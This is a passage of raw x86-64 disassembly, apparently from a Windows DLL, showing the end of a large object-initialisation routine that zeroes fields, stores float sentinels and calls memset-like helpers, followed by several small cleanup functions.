   1800024b6:	04 00 
   1800024b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800024bf:	00 
   1800024c0:	66 0f 6e f6          	movd   %esi,%xmm6
   1800024c4:	0f 5b f6             	cvtdq2ps %xmm6,%xmm6
   1800024c7:	f3 0f 58 f6          	addss  %xmm6,%xmm6
   1800024cb:	f3 0f 59 f7          	mulss  %xmm7,%xmm6
   1800024cf:	f3 41 0f 5e f0       	divss  %xmm8,%xmm6
   1800024d4:	0f 28 c6             	movaps %xmm6,%xmm0
   1800024d7:	e8 80 d8 03 00       	call   0x18003fd5c
   1800024dc:	f3 0f 11 07          	movss  %xmm0,(%rdi)
   1800024e0:	0f 28 c6             	movaps %xmm6,%xmm0
   1800024e3:	e8 8c d8 03 00       	call   0x18003fd74
   1800024e8:	f3 0f 11 47 04       	movss  %xmm0,0x4(%rdi)
   1800024ed:	ff c6                	inc    %esi
   1800024ef:	48 83 c7 08          	add    $0x8,%rdi
   1800024f3:	83 fe 0c             	cmp    $0xc,%esi
   1800024f6:	7c c8                	jl     0x1800024c0
   1800024f8:	48 89 ab c0 19 00 00 	mov    %rbp,0x19c0(%rbx)
   1800024ff:	48 89 ab c8 19 00 00 	mov    %rbp,0x19c8(%rbx)
   180002506:	48 89 ab d0 19 00 00 	mov    %rbp,0x19d0(%rbx)
   18000250d:	48 89 ab d8 19 00 00 	mov    %rbp,0x19d8(%rbx)
   180002514:	48 89 ab e0 19 00 00 	mov    %rbp,0x19e0(%rbx)
   18000251b:	48 89 ab e8 19 00 00 	mov    %rbp,0x19e8(%rbx)
   180002522:	48 89 ab f0 19 00 00 	mov    %rbp,0x19f0(%rbx)
   180002529:	48 89 ab f8 19 00 00 	mov    %rbp,0x19f8(%rbx)
   180002530:	48 89 ab 00 1a 00 00 	mov    %rbp,0x1a00(%rbx)
   180002537:	48 89 ab 08 1a 00 00 	mov    %rbp,0x1a08(%rbx)
   18000253e:	48 89 ab 40 1a 00 00 	mov    %rbp,0x1a40(%rbx)
   180002545:	48 89 ab 88 1a 00 00 	mov    %rbp,0x1a88(%rbx)
   18000254c:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000254f:	33 c0                	xor    %eax,%eax
   180002551:	0f 11 83 b8 1a 00 00 	movups %xmm0,0x1ab8(%rbx)
   180002558:	0f 11 83 c8 1a 00 00 	movups %xmm0,0x1ac8(%rbx)
   18000255f:	0f 11 83 d8 1a 00 00 	movups %xmm0,0x1ad8(%rbx)
   180002566:	0f 11 83 e8 1a 00 00 	movups %xmm0,0x1ae8(%rbx)
   18000256d:	0f 11 83 f8 1a 00 00 	movups %xmm0,0x1af8(%rbx)
   180002574:	0f 11 83 08 1b 00 00 	movups %xmm0,0x1b08(%rbx)
   18000257b:	48 89 83 18 1b 00 00 	mov    %rax,0x1b18(%rbx)
   180002582:	0f 11 83 20 1b 00 00 	movups %xmm0,0x1b20(%rbx)
   180002589:	48 89 ab 30 1b 00 00 	mov    %rbp,0x1b30(%rbx)
   180002590:	48 89 ab 38 1b 00 00 	mov    %rbp,0x1b38(%rbx)
   180002597:	48 89 ab 40 1b 00 00 	mov    %rbp,0x1b40(%rbx)
   18000259e:	48 89 ab 48 1b 00 00 	mov    %rbp,0x1b48(%rbx)
   1800025a5:	48 89 ab 50 1b 00 00 	mov    %rbp,0x1b50(%rbx)
   1800025ac:	48 89 ab 58 1b 00 00 	mov    %rbp,0x1b58(%rbx)
   1800025b3:	48 89 ab 60 1b 00 00 	mov    %rbp,0x1b60(%rbx)
   1800025ba:	48 89 ab 68 1b 00 00 	mov    %rbp,0x1b68(%rbx)
   1800025c1:	48 89 ab 70 1b 00 00 	mov    %rbp,0x1b70(%rbx)
   1800025c8:	48 89 ab 78 1b 00 00 	mov    %rbp,0x1b78(%rbx)
   1800025cf:	48 89 ab b0 1b 00 00 	mov    %rbp,0x1bb0(%rbx)
   1800025d6:	48 89 ab b8 1b 00 00 	mov    %rbp,0x1bb8(%rbx)
   1800025dd:	48 89 ab 00 1c 00 00 	mov    %rbp,0x1c00(%rbx)
   1800025e4:	48 89 ab 08 1c 00 00 	mov    %rbp,0x1c08(%rbx)
   1800025eb:	48 89 ab 28 1c 00 00 	mov    %rbp,0x1c28(%rbx)
   1800025f2:	48 89 ab 30 1c 00 00 	mov    %rbp,0x1c30(%rbx)
   1800025f9:	c7 83 40 1c 00 00 ff 	movl   $0x7f7fffff,0x1c40(%rbx)
   180002600:	ff 7f 7f 
   180002603:	c7 83 3c 1c 00 00 ff 	movl   $0x7f7fffff,0x1c3c(%rbx)
   18000260a:	ff 7f 7f 
   18000260d:	c7 83 38 1c 00 00 ff 	movl   $0x7f7fffff,0x1c38(%rbx)
   180002614:	ff 7f 7f 
   180002617:	48 89 ab 44 1c 00 00 	mov    %rbp,0x1c44(%rbx)
   18000261e:	48 89 ab 4c 1c 00 00 	mov    %rbp,0x1c4c(%rbx)
   180002625:	48 89 ab 58 1c 00 00 	mov    %rbp,0x1c58(%rbx)
   18000262c:	48 89 ab 60 1c 00 00 	mov    %rbp,0x1c60(%rbx)
   180002633:	c7 83 70 1c 00 00 ff 	movl   $0x7f7fffff,0x1c70(%rbx)
   18000263a:	ff 7f 7f 
   18000263d:	c7 83 6c 1c 00 00 ff 	movl   $0x7f7fffff,0x1c6c(%rbx)
   180002644:	ff 7f 7f 
   180002647:	c7 83 68 1c 00 00 ff 	movl   $0x7f7fffff,0x1c68(%rbx)
   18000264e:	ff 7f 7f 
   180002651:	48 89 ab 74 1c 00 00 	mov    %rbp,0x1c74(%rbx)
   180002658:	48 89 ab 7c 1c 00 00 	mov    %rbp,0x1c7c(%rbx)
   18000265f:	48 89 ab 88 1c 00 00 	mov    %rbp,0x1c88(%rbx)
   180002666:	48 89 ab 90 1c 00 00 	mov    %rbp,0x1c90(%rbx)
   18000266d:	c7 83 a0 1c 00 00 ff 	movl   $0x7f7fffff,0x1ca0(%rbx)
   180002674:	ff 7f 7f 
   180002677:	c7 83 9c 1c 00 00 ff 	movl   $0x7f7fffff,0x1c9c(%rbx)
   18000267e:	ff 7f 7f 
   180002681:	c7 83 98 1c 00 00 ff 	movl   $0x7f7fffff,0x1c98(%rbx)
   180002688:	ff 7f 7f 
   18000268b:	48 89 ab a4 1c 00 00 	mov    %rbp,0x1ca4(%rbx)
   180002692:	48 89 ab ac 1c 00 00 	mov    %rbp,0x1cac(%rbx)
   180002699:	88 83 e0 1c 00 00    	mov    %al,0x1ce0(%rbx)
   18000269f:	48 89 ab e8 1c 00 00 	mov    %rbp,0x1ce8(%rbx)
   1800026a6:	48 89 ab f4 1c 00 00 	mov    %rbp,0x1cf4(%rbx)
   1800026ad:	89 ab f0 1c 00 00    	mov    %ebp,0x1cf0(%rbx)
   1800026b3:	48 89 ab 0c 1d 00 00 	mov    %rbp,0x1d0c(%rbx)
   1800026ba:	48 89 ab 04 1d 00 00 	mov    %rbp,0x1d04(%rbx)
   1800026c1:	48 89 ab fc 1c 00 00 	mov    %rbp,0x1cfc(%rbx)
   1800026c8:	48 8d 8b 18 1d 00 00 	lea    0x1d18(%rbx),%rcx
   1800026cf:	48 8d 05 1a 48 01 00 	lea    0x1481a(%rip),%rax        # 0x180016ef0
   1800026d6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800026db:	4c 8d 0d 4e 4f 01 00 	lea    0x14f4e(%rip),%r9        # 0x180017630
   1800026e2:	ba 10 00 00 00       	mov    $0x10,%edx
   1800026e7:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1800026ed:	e8 62 c9 03 00       	call   0x18003f054
   1800026f2:	90                   	nop
   1800026f3:	48 8d 8b 40 1d 00 00 	lea    0x1d40(%rbx),%rcx
   1800026fa:	49 8b d6             	mov    %r14,%rdx
   1800026fd:	e8 9e f9 ff ff       	call   0x1800020a0
   180002702:	90                   	nop
   180002703:	48 8d 8b e8 1d 00 00 	lea    0x1de8(%rbx),%rcx
   18000270a:	49 8b d6             	mov    %r14,%rdx
   18000270d:	e8 8e f9 ff ff       	call   0x1800020a0
   180002712:	90                   	nop
   180002713:	48 89 ab b4 1e 00 00 	mov    %rbp,0x1eb4(%rbx)
   18000271a:	48 89 ab a8 1e 00 00 	mov    %rbp,0x1ea8(%rbx)
   180002721:	89 ab b0 1e 00 00    	mov    %ebp,0x1eb0(%rbx)
   180002727:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000272a:	33 c0                	xor    %eax,%eax
   18000272c:	0f 11 83 c0 1e 00 00 	movups %xmm0,0x1ec0(%rbx)
   180002733:	0f 11 83 d0 1e 00 00 	movups %xmm0,0x1ed0(%rbx)
   18000273a:	66 89 83 e0 1e 00 00 	mov    %ax,0x1ee0(%rbx)
   180002741:	c7 83 bc 1e 00 00 ff 	movl   $0xffffffff,0x1ebc(%rbx)
   180002748:	ff ff ff 
   18000274b:	88 83 e2 1e 00 00    	mov    %al,0x1ee2(%rbx)
   180002751:	48 89 ab e8 1e 00 00 	mov    %rbp,0x1ee8(%rbx)
   180002758:	48 89 ab f0 1e 00 00 	mov    %rbp,0x1ef0(%rbx)
   18000275f:	48 89 ab 10 1f 00 00 	mov    %rbp,0x1f10(%rbx)
   180002766:	48 89 ab 18 1f 00 00 	mov    %rbp,0x1f18(%rbx)
   18000276d:	48 89 ab 38 1f 00 00 	mov    %rbp,0x1f38(%rbx)
   180002774:	48 89 ab 40 1f 00 00 	mov    %rbp,0x1f40(%rbx)
   18000277b:	48 89 ab 48 1f 00 00 	mov    %rbp,0x1f48(%rbx)
   180002782:	48 89 ab 50 1f 00 00 	mov    %rbp,0x1f50(%rbx)
   180002789:	89 ab 58 1f 00 00    	mov    %ebp,0x1f58(%rbx)
   18000278f:	48 89 ab 60 1f 00 00 	mov    %rbp,0x1f60(%rbx)
   180002796:	48 89 ab 68 1f 00 00 	mov    %rbp,0x1f68(%rbx)
   18000279d:	48 89 ab 70 1f 00 00 	mov    %rbp,0x1f70(%rbx)
   1800027a4:	48 89 ab 78 1f 00 00 	mov    %rbp,0x1f78(%rbx)
   1800027ab:	48 89 ab 80 1f 00 00 	mov    %rbp,0x1f80(%rbx)
   1800027b2:	48 8d 8b 88 1f 00 00 	lea    0x1f88(%rbx),%rcx
   1800027b9:	33 d2                	xor    %edx,%edx
   1800027bb:	41 b8 90 0e 00 00    	mov    $0xe90,%r8d
   1800027c1:	e8 ae d3 03 00       	call   0x18003fb74
   1800027c6:	90                   	nop
   1800027c7:	48 89 ab 18 2e 00 00 	mov    %rbp,0x2e18(%rbx)
   1800027ce:	48 89 ab 20 2e 00 00 	mov    %rbp,0x2e20(%rbx)
   1800027d5:	48 89 ab 30 2e 00 00 	mov    %rbp,0x2e30(%rbx)
   1800027dc:	48 89 ab 38 2e 00 00 	mov    %rbp,0x2e38(%rbx)
   1800027e3:	48 89 ab 40 2e 00 00 	mov    %rbp,0x2e40(%rbx)
   1800027ea:	48 89 ab 48 2e 00 00 	mov    %rbp,0x2e48(%rbx)
   1800027f1:	48 89 ab 28 2e 00 00 	mov    %rbp,0x2e28(%rbx)
   1800027f8:	c7 83 72 2e 00 00 3f 	movl   $0xffff003f,0x2e72(%rbx)
   1800027ff:	00 ff ff 
   180002802:	48 89 ab 58 2e 00 00 	mov    %rbp,0x2e58(%rbx)
   180002809:	48 89 ab 50 2e 00 00 	mov    %rbp,0x2e50(%rbx)
   180002810:	48 89 ab 60 2e 00 00 	mov    %rbp,0x2e60(%rbx)
   180002817:	48 89 ab 68 2e 00 00 	mov    %rbp,0x2e68(%rbx)
   18000281e:	66 89 ab 70 2e 00 00 	mov    %bp,0x2e70(%rbx)
   180002825:	c6 83 88 2e 00 00 00 	movb   $0x0,0x2e88(%rbx)
   18000282c:	48 c7 83 78 2e 00 00 	movq   $0x3f800000,0x2e78(%rbx)
   180002833:	00 00 80 3f 
   180002837:	48 89 ab 80 2e 00 00 	mov    %rbp,0x2e80(%rbx)
   18000283e:	48 89 ab b0 2e 00 00 	mov    %rbp,0x2eb0(%rbx)
   180002845:	48 89 ab a8 2e 00 00 	mov    %rbp,0x2ea8(%rbx)
   18000284c:	48 89 ab d0 2e 00 00 	mov    %rbp,0x2ed0(%rbx)
   180002853:	48 89 ab d8 2e 00 00 	mov    %rbp,0x2ed8(%rbx)
   18000285a:	48 89 ab e4 2e 00 00 	mov    %rbp,0x2ee4(%rbx)
   180002861:	48 89 ab ec 2e 00 00 	mov    %rbp,0x2eec(%rbx)
   180002868:	48 89 ab 00 2f 00 00 	mov    %rbp,0x2f00(%rbx)
   18000286f:	48 89 ab 08 2f 00 00 	mov    %rbp,0x2f08(%rbx)
   180002876:	48 89 ab 10 2f 00 00 	mov    %rbp,0x2f10(%rbx)
   18000287d:	48 89 ab 18 2f 00 00 	mov    %rbp,0x2f18(%rbx)
   180002884:	48 89 ab 20 2f 00 00 	mov    %rbp,0x2f20(%rbx)
   18000288b:	48 89 ab 28 2f 00 00 	mov    %rbp,0x2f28(%rbx)
   180002892:	48 89 ab 40 2f 00 00 	mov    %rbp,0x2f40(%rbx)
   180002899:	48 89 ab 48 2f 00 00 	mov    %rbp,0x2f48(%rbx)
   1800028a0:	66 c7 03 00 01       	movw   $0x100,(%rbx)
   1800028a5:	48 89 ab 08 19 00 00 	mov    %rbp,0x1908(%rbx)
   1800028ac:	48 89 ab 10 19 00 00 	mov    %rbp,0x1910(%rbx)
   1800028b3:	48 8b 05 16 a5 07 00 	mov    0x7a516(%rip),%rax        # 0x18007cdd0
   1800028ba:	48 85 c0             	test   %rax,%rax
   1800028bd:	74 06                	je     0x1800028c5
   1800028bf:	ff 80 bc 03 00 00    	incl   0x3bc(%rax)
   1800028c5:	b9 78 00 00 00       	mov    $0x78,%ecx
   1800028ca:	ff 15 00 eb 03 00    	call   *0x3eb00(%rip)        # 0x1800413d0
   1800028d0:	48 85 c0             	test   %rax,%rax
   1800028d3:	74 49                	je     0x18000291e
   1800028d5:	48 89 68 40          	mov    %rbp,0x40(%rax)
   1800028d9:	48 89 68 48          	mov    %rbp,0x48(%rax)
   1800028dd:	48 89 68 50          	mov    %rbp,0x50(%rax)
   1800028e1:	48 89 68 58          	mov    %rbp,0x58(%rax)
   1800028e5:	48 89 68 60          	mov    %rbp,0x60(%rax)
   1800028e9:	48 89 68 68          	mov    %rbp,0x68(%rax)
   1800028ed:	c6 00 00             	movb   $0x0,(%rax)
   1800028f0:	89 68 04             	mov    %ebp,0x4(%rax)
   1800028f3:	48 89 68 08          	mov    %rbp,0x8(%rax)
   1800028f7:	89 68 10             	mov    %ebp,0x10(%rax)
   1800028fa:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
   180002901:	48 89 68 18          	mov    %rbp,0x18(%rax)
   180002905:	48 89 68 20          	mov    %rbp,0x20(%rax)
   180002909:	48 89 68 28          	mov    %rbp,0x28(%rax)
   18000290d:	48 89 68 30          	mov    %rbp,0x30(%rax)
   180002911:	48 89 68 38          	mov    %rbp,0x38(%rax)
   180002915:	c7 40 70 ff ff ff ff 	movl   $0xffffffff,0x70(%rax)
   18000291c:	eb 03                	jmp    0x180002921
   18000291e:	48 8b c5             	mov    %rbp,%rax
   180002921:	48 89 83 a8 00 00 00 	mov    %rax,0xa8(%rbx)
   180002928:	48 89 ab a8 19 00 00 	mov    %rbp,0x19a8(%rbx)
   18000292f:	89 ab b0 19 00 00    	mov    %ebp,0x19b0(%rbx)
   180002935:	48 c7 83 b4 19 00 00 	movq   $0xffffffffffffffff,0x19b4(%rbx)
   18000293c:	ff ff ff ff 
   180002940:	66 c7 83 bd 19 00 00 	movw   $0x0,0x19bd(%rbx)
   180002947:	00 00 
   180002949:	c6 83 bc 19 00 00 00 	movb   $0x0,0x19bc(%rbx)
   180002950:	89 ab 10 1a 00 00    	mov    %ebp,0x1a10(%rbx)
   180002956:	48 89 ab 18 1a 00 00 	mov    %rbp,0x1a18(%rbx)
   18000295d:	48 89 ab 20 1a 00 00 	mov    %rbp,0x1a20(%rbx)
   180002964:	48 89 ab 28 1a 00 00 	mov    %rbp,0x1a28(%rbx)
   18000296b:	48 89 ab 30 1a 00 00 	mov    %rbp,0x1a30(%rbx)
   180002972:	48 89 ab 38 1a 00 00 	mov    %rbp,0x1a38(%rbx)
   180002979:	48 89 ab 48 1a 00 00 	mov    %rbp,0x1a48(%rbx)
   180002980:	c6 83 50 1a 00 00 00 	movb   $0x0,0x1a50(%rbx)
   180002987:	48 89 ab 54 1a 00 00 	mov    %rbp,0x1a54(%rbx)
   18000298e:	48 89 ab 5c 1a 00 00 	mov    %rbp,0x1a5c(%rbx)
   180002995:	48 89 ab 64 1a 00 00 	mov    %rbp,0x1a64(%rbx)
   18000299c:	c7 83 6c 1a 00 00 00 	movl   $0x0,0x1a6c(%rbx)
   1800029a3:	00 00 00 
   1800029a6:	c6 83 70 1a 00 00 00 	movb   $0x0,0x1a70(%rbx)
   1800029ad:	48 89 ab 74 1a 00 00 	mov    %rbp,0x1a74(%rbx)
   1800029b4:	48 89 ab 80 1a 00 00 	mov    %rbp,0x1a80(%rbx)
   1800029bb:	c7 83 88 1a 00 00 00 	movl   $0xbf800000,0x1a88(%rbx)
   1800029c2:	00 80 bf 
   1800029c5:	c7 83 8c 1a 00 00 00 	movl   $0xbf800000,0x1a8c(%rbx)
   1800029cc:	00 80 bf 
   1800029cf:	48 89 ab 90 1a 00 00 	mov    %rbp,0x1a90(%rbx)
   1800029d6:	48 89 ab 98 1a 00 00 	mov    %rbp,0x1a98(%rbx)
   1800029dd:	66 c7 83 a0 1a 00 00 	movw   $0x0,0x1aa0(%rbx)
   1800029e4:	00 00 
   1800029e6:	48 89 ab a8 1a 00 00 	mov    %rbp,0x1aa8(%rbx)
   1800029ed:	48 89 ab b0 1a 00 00 	mov    %rbp,0x1ab0(%rbx)
   1800029f4:	48 89 ab 80 1b 00 00 	mov    %rbp,0x1b80(%rbx)
   1800029fb:	48 89 ab 94 1b 00 00 	mov    %rbp,0x1b94(%rbx)
   180002a02:	48 89 ab 8c 1b 00 00 	mov    %rbp,0x1b8c(%rbx)
   180002a09:	89 ab 88 1b 00 00    	mov    %ebp,0x1b88(%rbx)
   180002a0f:	48 89 ab a4 1b 00 00 	mov    %rbp,0x1ba4(%rbx)
   180002a16:	48 89 ab 9c 1b 00 00 	mov    %rbp,0x1b9c(%rbx)
   180002a1d:	48 89 ab ac 1b 00 00 	mov    %rbp,0x1bac(%rbx)
   180002a24:	48 89 ab b4 1b 00 00 	mov    %rbp,0x1bb4(%rbx)
   180002a2b:	48 89 ab bc 1b 00 00 	mov    %rbp,0x1bbc(%rbx)
   180002a32:	48 89 ab d8 1b 00 00 	mov    %rbp,0x1bd8(%rbx)
   180002a39:	48 89 ab d0 1b 00 00 	mov    %rbp,0x1bd0(%rbx)
   180002a40:	48 89 ab c8 1b 00 00 	mov    %rbp,0x1bc8(%rbx)
   180002a47:	48 89 ab e0 1b 00 00 	mov    %rbp,0x1be0(%rbx)
   180002a4e:	c6 83 e8 1b 00 00 00 	movb   $0x0,0x1be8(%rbx)
   180002a55:	89 ab ec 1b 00 00    	mov    %ebp,0x1bec(%rbx)
   180002a5b:	c7 83 f0 1b 00 00 ff 	movl   $0x7fffffff,0x1bf0(%rbx)
   180002a62:	ff ff 7f 
   180002a65:	c7 83 f4 1b 00 00 00 	movl   $0x10000,0x1bf4(%rbx)
   180002a6c:	00 01 00 
   180002a6f:	66 c7 83 f8 1b 00 00 	movw   $0x0,0x1bf8(%rbx)
   180002a76:	00 00 
   180002a78:	c6 83 fa 1b 00 00 00 	movb   $0x0,0x1bfa(%rbx)
   180002a7f:	89 ab fc 1b 00 00    	mov    %ebp,0x1bfc(%rbx)
   180002a85:	66 c7 83 10 1c 00 00 	movw   $0x0,0x1c10(%rbx)
   180002a8c:	00 00 
   180002a8e:	48 89 ab 14 1c 00 00 	mov    %rbp,0x1c14(%rbx)
   180002a95:	48 c7 83 20 1c 00 00 	movq   $0xffffffffffffffff,0x1c20(%rbx)
   180002a9c:	ff ff ff ff 
   180002aa0:	c7 83 1c 1c 00 00 ff 	movl   $0xffffffff,0x1c1c(%rbx)
   180002aa7:	ff ff ff 
   180002aaa:	48 89 ab c0 1c 00 00 	mov    %rbp,0x1cc0(%rbx)
   180002ab1:	48 89 ab b8 1c 00 00 	mov    %rbp,0x1cb8(%rbx)
   180002ab8:	c7 83 cc 1c 00 00 ff 	movl   $0x7fffffff,0x1ccc(%rbx)
   180002abf:	ff ff 7f 
   180002ac2:	c7 83 c8 1c 00 00 ff 	movl   $0x7fffffff,0x1cc8(%rbx)
   180002ac9:	ff ff 7f 
   180002acc:	c7 83 d4 1c 00 00 ff 	movl   $0x7fffffff,0x1cd4(%rbx)
   180002ad3:	ff ff 7f 
   180002ad6:	c7 83 d0 1c 00 00 ff 	movl   $0x7fffffff,0x1cd0(%rbx)
   180002add:	ff ff 7f 
   180002ae0:	c6 83 d8 1c 00 00 00 	movb   $0x0,0x1cd8(%rbx)
   180002ae7:	89 ab 38 1d 00 00    	mov    %ebp,0x1d38(%rbx)
   180002aed:	48 8d 05 cc ec 03 00 	lea    0x3eccc(%rip),%rax        # 0x1800417c0
   180002af4:	48 89 83 80 1d 00 00 	mov    %rax,0x1d80(%rbx)
   180002afb:	48 8d 05 ce ec 03 00 	lea    0x3ecce(%rip),%rax        # 0x1800417d0
   180002b02:	48 89 83 28 1e 00 00 	mov    %rax,0x1e28(%rbx)
   180002b09:	89 ab 90 1e 00 00    	mov    %ebp,0x1e90(%rbx)
   180002b0f:	66 c7 83 94 1e 00 00 	movw   $0x0,0x1e94(%rbx)
   180002b16:	00 00 
   180002b18:	89 ab 98 1e 00 00    	mov    %ebp,0x1e98(%rbx)
   180002b1e:	48 c7 83 9c 1e 00 00 	movq   $0xffffffffffffffff,0x1e9c(%rbx)
   180002b25:	ff ff ff ff 
   180002b29:	48 89 ab f8 1e 00 00 	mov    %rbp,0x1ef8(%rbx)
   180002b30:	48 89 ab 00 1f 00 00 	mov    %rbp,0x1f00(%rbx)
   180002b37:	89 ab 08 1f 00 00    	mov    %ebp,0x1f08(%rbx)
   180002b3d:	c7 83 0c 1f 00 00 ff 	movl   $0xffffffff,0x1f0c(%rbx)
   180002b44:	ff ff ff 
   180002b47:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002b4a:	0f 11 83 20 1f 00 00 	movups %xmm0,0x1f20(%rbx)
   180002b51:	48 89 ab 30 1f 00 00 	mov    %rbp,0x1f30(%rbx)
   180002b58:	48 89 ab 80 1f 00 00 	mov    %rbp,0x1f80(%rbx)
   180002b5f:	89 ab 90 2e 00 00    	mov    %ebp,0x2e90(%rbx)
   180002b65:	48 c7 83 94 2e 00 00 	movq   $0xa900000,0x2e94(%rbx)
   180002b6c:	00 00 90 0a 
   180002b70:	c7 83 a4 2e 00 00 ff 	movl   $0x7f7fffff,0x2ea4(%rbx)
   180002b77:	ff 7f 7f 
   180002b7a:	c7 83 a0 2e 00 00 ff 	movl   $0x7f7fffff,0x2ea0(%rbx)
   180002b81:	ff 7f 7f 
   180002b84:	c7 83 9c 2e 00 00 ff 	movl   $0x7f7fffff,0x2e9c(%rbx)
   180002b8b:	ff 7f 7f 
   180002b8e:	c6 83 b8 2e 00 00 00 	movb   $0x0,0x2eb8(%rbx)
   180002b95:	89 ab bc 2e 00 00    	mov    %ebp,0x2ebc(%rbx)
   180002b9b:	48 c7 83 c0 2e 00 00 	movq   $0x3c23d70a,0x2ec0(%rbx)
   180002ba2:	0a d7 23 3c 
   180002ba6:	89 ab c8 2e 00 00    	mov    %ebp,0x2ec8(%rbx)
   180002bac:	89 ab e0 2e 00 00    	mov    %ebp,0x2ee0(%rbx)
   180002bb2:	c7 83 ec 2e 00 00 ff 	movl   $0x7f7fffff,0x2eec(%rbx)
   180002bb9:	ff 7f 7f 
   180002bbc:	c7 83 f0 2e 00 00 ff 	movl   $0x7f7fffff,0x2ef0(%rbx)
   180002bc3:	ff 7f 7f 
   180002bc6:	c7 83 e4 2e 00 00 ff 	movl   $0x7f7fffff,0x2ee4(%rbx)
   180002bcd:	ff 7f 7f 
   180002bd0:	c7 83 e8 2e 00 00 ff 	movl   $0x7f7fffff,0x2ee8(%rbx)
   180002bd7:	ff 7f 7f 
   180002bda:	c6 83 f4 2e 00 00 00 	movb   $0x0,0x2ef4(%rbx)
   180002be1:	89 ab f8 2e 00 00    	mov    %ebp,0x2ef8(%rbx)
   180002be7:	c6 83 30 2f 00 00 00 	movb   $0x0,0x2f30(%rbx)
   180002bee:	89 ab 34 2f 00 00    	mov    %ebp,0x2f34(%rbx)
   180002bf4:	48 89 ab 38 2f 00 00 	mov    %rbp,0x2f38(%rbx)
   180002bfb:	c7 83 50 2f 00 00 ff 	movl   $0x7f7fffff,0x2f50(%rbx)
   180002c02:	ff 7f 7f 
   180002c05:	c6 83 54 2f 00 00 00 	movb   $0x0,0x2f54(%rbx)
   180002c0c:	89 ab 58 2f 00 00    	mov    %ebp,0x2f58(%rbx)
   180002c12:	c7 83 60 2f 00 00 02 	movl   $0x2,0x2f60(%rbx)
   180002c19:	00 00 00 
   180002c1c:	c7 83 5c 2f 00 00 02 	movl   $0x2,0x2f5c(%rbx)
   180002c23:	00 00 00 
   180002c26:	c6 83 64 2f 00 00 00 	movb   $0x0,0x2f64(%rbx)
   180002c2d:	89 ab 68 2f 00 00    	mov    %ebp,0x2f68(%rbx)
   180002c33:	48 8d 8b 6c 2f 00 00 	lea    0x2f6c(%rbx),%rcx
   180002c3a:	33 d2                	xor    %edx,%edx
   180002c3c:	41 b8 e0 01 00 00    	mov    $0x1e0,%r8d
   180002c42:	e8 2d cf 03 00       	call   0x18003fb74
   180002c47:	48 89 ab 4c 31 00 00 	mov    %rbp,0x314c(%rbx)
   180002c4e:	48 c7 83 58 31 00 00 	movq   $0xffffffffffffffff,0x3158(%rbx)
   180002c55:	ff ff ff ff 
   180002c59:	c7 83 54 31 00 00 ff 	movl   $0xffffffff,0x3154(%rbx)
   180002c60:	ff ff ff 
   180002c63:	48 8d 8b 60 31 00 00 	lea    0x3160(%rbx),%rcx
   180002c6a:	33 d2                	xor    %edx,%edx
   180002c6c:	41 b8 01 0c 00 00    	mov    $0xc01,%r8d
   180002c72:	e8 fd ce 03 00       	call   0x18003fb74
   180002c77:	90                   	nop
   180002c78:	48 8b c3             	mov    %rbx,%rax
   180002c7b:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   180002c80:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180002c84:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   180002c88:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   180002c8d:	0f 28 7c 24 40       	movaps 0x40(%rsp),%xmm7
   180002c92:	45 0f 28 43 d0       	movaps -0x30(%r11),%xmm8
   180002c97:	49 8b e3             	mov    %r11,%rsp
   180002c9a:	41 5e                	pop    %r14
   180002c9c:	5f                   	pop    %rdi
   180002c9d:	5e                   	pop    %rsi
   180002c9e:	c3                   	ret
   180002c9f:	cc                   	int3
   180002ca0:	48 83 ec 28          	sub    $0x28,%rsp
   180002ca4:	48 8b 89 48 15 00 00 	mov    0x1548(%rcx),%rcx
   180002cab:	48 85 c9             	test   %rcx,%rcx
   180002cae:	74 19                	je     0x180002cc9
   180002cb0:	48 8b 05 19 a1 07 00 	mov    0x7a119(%rip),%rax        # 0x18007cdd0
   180002cb7:	48 85 c0             	test   %rax,%rax
   180002cba:	74 06                	je     0x180002cc2
   180002cbc:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   180002cc2:	ff 15 10 e7 03 00    	call   *0x3e710(%rip)        # 0x1800413d8
   180002cc8:	90                   	nop
   180002cc9:	48 83 c4 28          	add    $0x28,%rsp
   180002ccd:	c3                   	ret
   180002cce:	cc                   	int3
   180002ccf:	cc                   	int3
   180002cd0:	48 83 ec 28          	sub    $0x28,%rsp
   180002cd4:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   180002cd8:	48 85 c9             	test   %rcx,%rcx
   180002cdb:	74 19                	je     0x180002cf6
   180002cdd:	48 8b 05 ec a0 07 00 	mov    0x7a0ec(%rip),%rax        # 0x18007cdd0
   180002ce4:	48 85 c0             	test   %rax,%rax
   180002ce7:	74 06                	je     0x180002cef
   180002ce9:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   180002cef:	ff 15 e3 e6 03 00    	call   *0x3e6e3(%rip)        # 0x1800413d8
   180002cf5:	90                   	nop
   180002cf6:	48 83 c4 28          	add    $0x28,%rsp
   180002cfa:	c3                   	ret
   180002cfb:	cc                   	int3
   180002cfc:	cc                   	int3
   180002cfd:	cc                   	int3
   180002cfe:	cc                   	int3
   180002cff:	cc                   	int3
   180002d00:	48 83 ec 28          	sub    $0x28,%rsp
   180002d04:	4c 8d 0d e5 41 01 00 	lea    0x141e5(%rip),%r9        # 0x180016ef0
   180002d0b:	ba 10 00 00 00       	mov    $0x10,%edx
   180002d10:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180002d16:	e8 71 c2 03 00       	call   0x18003ef8c
   180002d1b:	90                   	nop
   180002d1c:	48 83 c4 28          	add    $0x28,%rsp
   180002d20:	c3                   	ret
   180002d21:	cc                   	int3
   180002d22:	cc                   	int3
   180002d23:	cc                   	int3
   180002d24:	cc                   	int3
   180002d25:	cc                   	int3
   180002d26:	cc                   	int3
   180002d27:	cc                   	int3
   180002d28:	cc                   	int3
   180002d29:	cc                   	int3
   180002d2a:	cc                   	int3
   180002d2b:	cc                   	int3
   180002d2c:	cc                   	int3
   180002d2d:	cc                   	int3
   180002d2e:	cc                   	int3
   180002d2f:	cc                   	int3
   180002d30:	40 53                	rex push %rbx
   180002d32:	48 83 ec 20          	sub    $0x20,%rsp
